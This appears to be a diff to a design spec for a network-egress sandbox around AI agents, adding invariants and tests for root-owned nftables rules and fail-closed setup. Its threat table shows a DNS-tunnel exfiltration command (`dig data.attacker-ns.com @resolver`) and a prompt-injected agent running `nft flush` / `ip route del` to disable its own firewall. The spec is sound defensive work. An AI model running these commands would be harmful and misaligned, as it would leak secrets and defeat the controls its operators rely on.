@@ -189,6 +189,8 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 | **Rotating CDN IPs mid-lease** | a provider (github.com, api.anthropic.com) rotates to an IP not in the resolved set during a long lease | the connect to the new IP drops. **Launch mitigation:** the launch set (inference + 8 registries) is small/stable, resolved at setup; for long leases, PLAN decides periodic re-resolve OR a provider CIDR allowance. The complete fix (name-layer) is the deferred §5 proxy. Document the limitation; don't silently widen to a CIDR that re-opens exfil. |
 | nft/netns setup fails | kernel/permission error installing rules | child has **no** egress (fail-closed); lease classified a sandbox/egress failure, never falls back to open net. `test_egress_fails_closed_without_rules`. |
 | In-child forwarding resolver | an implementer "just allows port 53" to a real/recursive resolver | **reopens DNS-tunnel exfil** (`dig data.attacker-ns.com @resolver` smuggles secrets in query names past the IP-allowlist). Forbidden by §3.3: child resolution is parent-provided / non-forwarding-stub only. Caught by `test_dns_tunnel_query_dropped`. |
+| Child disables its own firewall | a prompt-injected agent runs `nft flush` / `ip route del` inside its netns | **no effect** — the rules are root-owned on the host side of the veth (Invariant 6); the child's namespace-local caps don't reach them. Caught by `test_child_cannot_flush_egress_rules`. |
+| Open-net half-state | a logic bug emits `--share-net` AND skips the nft install | **forbidden** — own-filtered-netns XOR host-share, and setup failure is fail-closed (Invariant 7); the child is never in the host netns without nft. Caught by `test_no_open_net_half_state`. |
 | Operator runs `deny_all` | no network configured | unchanged — empty netns, no veth; the agent has no egress (correct for non-network agents). |
 
 ---
@@ -200,6 +202,8 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 3. **No datastore credential in the child** — the runner is built `base,sqlite` (`build_runner.zig`); the child holds no database connection string and opens no datastore socket; durable memory is the control plane's HTTPS responsibility. **Never build the runner with `-Dengines=postgres`.** Enforced by a build-config assertion + the absence of a DB host in the resolved allowlist.
 4. **Allowlist is parent-owned** — nothing in the child's environment or lease can widen the resolved nft set. Enforced by `test_allowlist_not_child_extendable`.
 5. **Legitimate path unchanged** — inference endpoint + declared `allow_hosts` (rules installed) produce an identical observable outcome; a golden-arg/integration test pins it.
+6. **Egress rules are root-owned and child-unreachable** — the netns / veth / nftables config is installed by the **root daemon on the host side of the veth** (or in a netns the child's user namespace does **not** own). The sandboxed child holds only namespace-local capabilities and **cannot `nft flush`, alter routes, or reconfigure the veth** to widen its own egress. Enforced by `test_child_cannot_flush_egress_rules`.
+7. **Fail-closed, never a half-open state** — any netns/veth/nft setup failure yields **no egress** (the lease is refused as a sandbox/egress failure); there is **no** fallback to `--share-net` / open net. The build is own-filtered-netns **XOR** host-net-share — it must never leave the child in the host netns *without* nft installed. Enforced by `test_egress_fails_closed_without_rules` + `test_no_open_net_half_state`.
 
 ---
 
@@ -217,6 +221,8 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 | 3.1 | unit + integration-runner | `test_inference_host_always_allowed` | configured inference endpoint resolved + present in the nft set; unresolvable → fail-closed at setup |
 | 3.2 | unit | `test_allowlist_not_child_extendable` | an `allow_hosts`-like value in child env/lease does NOT widen the nft set |
 | 3.3 | integration-runner | `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped` | child has no port-53 path to a forwarding resolver; a `dig data.x.com @resolver` tunnel attempt is dropped; allowlisted-name resolution still succeeds via the parent-provided path |
+| Inv 6 | integration-runner | `test_child_cannot_flush_egress_rules` | a child runs `nft flush` / `ip route del` with its in-userns caps → the enforced egress set is unchanged (rules are host-side, root-owned) |
+| Inv 7 | integration-runner | `test_no_open_net_half_state` | a build that emits `--share-net` AND skips the nft install is rejected; the child is never left in the host netns without nft (own-netns XOR host-share) |
 
 - **Regression:** existing runner suite (`make test-unit-zigrunner`) + a legitimate end-to-end lease (inference + an allowed tool host) still pass — the network-enabled agent still works.
 - **Idempotency/replay:** N/A.
@@ -229,7 +235,8 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 - [ ] No sandboxed tier emits `--share-net`; child net namespace unshared — verify: `test_no_share_net_on_any_sandboxed_tier`
 - [ ] Allowed inference IP reachable; non-allowed IP dropped — verify: `test_allowed_ip_reachable` + `test_denied_ip_dropped`
 - [ ] Link-local / loopback-to-host / private-range dropped — verify: `test_link_local_and_private_denied`
-- [ ] nft/netns setup failure fails closed (no open-net fallback) — verify: `test_egress_fails_closed_without_rules`
+- [ ] nft/netns setup failure fails closed (no open-net fallback); no `--share-net`+skipped-nft half-state — verify: `test_egress_fails_closed_without_rules` + `test_no_open_net_half_state`
+- [ ] Egress rules root-owned (host side of the veth); a sandboxed child cannot `nft flush` / reconfigure its own firewall — verify: `test_child_cannot_flush_egress_rules`
 - [ ] Inference endpoint always resolved into the nft set; allowlist not child-extendable — verify: `test_inference_host_always_allowed` + `test_allowlist_not_child_extendable`
 - [ ] No forwarding DNS resolver reachable from the child; DNS-tunnel attempt dropped (parent-provided resolution) — verify: `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
 - [ ] Child holds no datastore credential; runner not built with postgres engine — verify: `grep -n 'engines' build_runner.zig` shows `base,sqlite`; no DB host in the resolved allowlist
